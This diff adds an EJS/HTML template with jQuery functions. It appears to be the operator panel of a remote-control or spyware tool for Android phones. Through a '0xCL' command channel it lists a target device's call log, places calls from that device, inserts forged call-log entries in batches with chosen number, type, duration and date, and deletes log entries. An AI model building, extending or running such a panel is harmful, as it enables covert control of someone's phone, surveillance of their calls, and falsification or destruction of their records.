@@ -1,0 +1,240 @@
+<div class="ui segment">
+    <div class="ui top attached tabular inverted white menu" style="
+    margin-left: 0!important;
+    margin-right: 0!important;">
+        <a class="item active" data-tab="calls">
+            Calls
+        </a>
+        <a class="item" data-tab="addCall">
+            Add Call Log
+        </a>
+        <a class="item" data-tab="delCall">
+            Delete Call Log
+        </a>
+        <div class="right menu">
+            <button onclick="updateButton(this, '0xCL', {'action': 'getCall'})" class="ui blue button"> <i
+                    class="icon sync"></i>Update</button>
+        </div>
+    </div>
+    <!---calls --->
+    <div class="ui bottom attached tab segment active" data-tab="calls">
+    	<div class="ui labeled input fluid">
+            <div class="ui label">
+                Number
+            </div>
+            <input id="numberMC" type="text" autocomplete="off">
+        </div>
+        <button class="ui button fluid positive" type="submit" onclick="makeCall(this)">
+                <i class="phone icon"></i>
+                Make Call
+        </button>
+        <table class="ui sortable celled table">
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Phone Number</th>
+                    <th>Status</th>
+                    <th>Duration</th>
+                </tr>
+            </thead>
+            <tbody>
+                <% pageData.forEach((callData) => { 
+
+                    let deleted = callData.deleted;
+                	if(deleted)return;
+                    let date = new Date(parseInt(callData.date));
+                    let status = "UNKNOWN";
+                    if(callData.type === 1) status = "IN";
+                    if(callData.type === 2) status = "OUT";
+                    if(callData.type === 3) status = "MISSED";
+                    
+                %>
+                <tr>
+                    <td class="collapsing"><%= date.toLocaleString('ru-RU', { timeZone: 'Asia/Yekaterinburg' }) %></td>
+                    <td><a href="?filter=<%= callData.phoneNumber %>"><%= callData.phoneNumber %></a></td>
+                    <td><%= status %></td>
+                    <td><%= callData.duration %></td>
+                </tr>
+                <% }) %>
+
+            </tbody>
+        </table>
+    </div>
+    <!---add call --->
+    <div class="ui bottom attached tab segment" data-tab="addCall">
+
+        <div class="ui form">
+
+            <div class="ui right labeled input">
+                <input type="number" placeholder="Duration" id="duration">
+                <div class="ui dropdown label">
+                    <div id="intervalMeasure" class="text">minutes</div>
+                    <i class="dropdown icon"></i>
+                    <div class="menu">
+                        <div class="item">hours</div>
+                        <div class="item">seconds</div>
+                        <div class="item">minutes</div>
+                    </div>
+                </div>
+            </div>
+            <div style="position: absolute; display: initial;right: 0%;">
+                <div class="ui labeled input">
+                    <input type="number" placeholder="Count" id="count" value="1" min="1" max="50">
+                </div>
+            </div>
+            <p></p>
+            <div class="ui right labeled input">
+                <div class="ui dropdown label">
+                    <div id="type" class="text">INCOMING</div>
+                    <i class="dropdown icon"></i>
+                    <div class="menu">
+                        <div class="item">INCOMING</div>
+                        <div class="item">OUTGOING</div>
+                        <div class="item">MISSED</div>
+                    </div>
+                </div>
+            </div>
+            <p></p>
+            <div class="ui labeled input fluid">
+                <div class="ui label">
+                    Number
+                </div>
+                <input id="number" type="text" autocomplete="off">
+            </div>
+            <p></p>
+            <div class="ui labeled input fluid">
+                <div class="ui label">
+                    Date
+                </div>
+                <input id="date" type="datetime-local" autocomplete="off" placeholder="dd.MM.yyyy HH:mm:ss">
+            </div>
+            <br>
+            <button class="ui button fluid positive" type="submit" onclick="addCall(this)">
+                <i class="user plus icon"></i>
+                Add
+            </button>
+        </div>
+    </div>
+    <!---delete call --->
+    <div class="ui bottom attached tab segment" data-tab="delCall">
+        <table class="ui sortable celled table">
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Phone Number</th>
+                    <th>Status</th>
+                    <th>Duration</th>
+                </tr>
+            </thead>
+            <tbody>
+                <% pageData.forEach((callData) => { 
+                    let deleted = callData.deleted;
+                	if(callData.deleted) return;
+                    
+                    let date = new Date(parseInt(callData.date));
+                    let status = "UNKNOWN";
+                    if(callData.type === 1) status = "IN";
+                    if(callData.type === 2) status = "OUT";
+                    if(callData.type === 3) status = "MISSED";
+                    
+                %>
+                <tr <% if(deleted){  %> style="color: red;" <% } %> >
+                    <td class="collapsing"><%= date.toLocaleString('ru-RU', { timeZone: 'Asia/Yekaterinburg' }) %></td>
+                    <td><a href="?filter=<%= callData.phoneNumber %>"><%= callData.phoneNumber %></a></td>
+                    <td><%= status %></td>
+                    <td><%= callData.duration %></td>
+                    <td class="collapsing">
+                        <button class="ui button inverted red basic " <% if(deleted){ %> disabled <% } %> onclick="delCall(this,<%=callData.date%>)">
+                            Delete
+                        </button>
+                    </td>
+                </tr>
+                <% }) %>
+
+            </tbody>
+        </table>
+    </div>
+    
+</div>
+
+<script type="text/javascript"> 
+    $('table').tablesort();
+    $('.menu .item').tab();
+    $('.ui.dropdown').dropdown();
+    
+    function IntervalToS() {
+        var intMes = $('#intervalMeasure').text();
+        var multiplier = 1;
+        if (intMes === "hours") multiplier = 3600;
+        if (intMes === "minutes") multiplier = 60;
+        return ($('#duration').val() * multiplier);
+    }
+
+    function getType() {
+        var intMes = $('#type').text();
+        var multiplier = 3;
+        if (intMes === "INCOMING") multiplier = 1;
+        if (intMes === "OUTGOING") multiplier = 2;
+        return multiplier;
+    }
+
+    function addCall(element){
+        var date = new Date($('#date').val());
+		var milliseconds = date.getTime(); 
+		console.log(milliseconds);
+
+        $(element).addClass('loading')
+        sendCommand('0xCL', {
+            'action': 'addCL',
+            'typeСall': getType(),
+            'number': $('#number').val(),
+            'duration': IntervalToS(),
+            'date': milliseconds,
+            'count': $('#count').val()
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'Call Add');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+
+    function delCall(element,date) {
+
+    	$.post(baseURL + '/CALLS/' + date, function (data) {
+            if (data.error) showNotification('#f03434', data.error)
+            else showNotification('#2ecc71', 'Deleted!');
+        });
+
+    }
+
+    function makeCall(element){
+
+        $(element).addClass('loading')
+        sendCommand('0xCL', {
+            'action': 'MakeCall',
+            'number': $('#numberMC').val(),
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'Called '+ $('#numberMC').val());
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+</script>
